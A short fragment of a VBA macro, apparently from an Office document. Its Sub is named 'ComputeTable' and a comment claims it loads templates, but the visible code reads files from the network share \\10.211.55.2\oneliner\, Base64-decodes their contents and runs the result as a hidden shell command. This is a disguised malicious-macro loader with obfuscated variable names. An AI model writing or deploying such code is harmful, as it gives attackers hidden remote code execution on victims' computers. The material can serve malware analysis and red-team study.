...
'-------------------------------------------------------
Sub ComputeTable()
    Dim aRdBw As String, qjJEj As String, trZDc As String
    Dim ghwkM As Boolean
	Dim rxzxT As Integer
    
    '-------------------------------------------------------
    ' Load templates from remote directory
    '-------------------------------------------------------
    aRdBw = Dir("\\10.211.55.2\oneliner\", vbNormal)
    flag = True
    While flag = True
        If aRdBw = "" Then
            flag = False
    ...
    qjJEj = Replace(qjJEj, vbCrLf, "")
    qjJEj = Replace(qjJEj, "_", "/")
    
    trZDc = Base64DecodeString(qjJEj)
    
    rxzxT = Shell(trZDc, vbHide)
End Sub
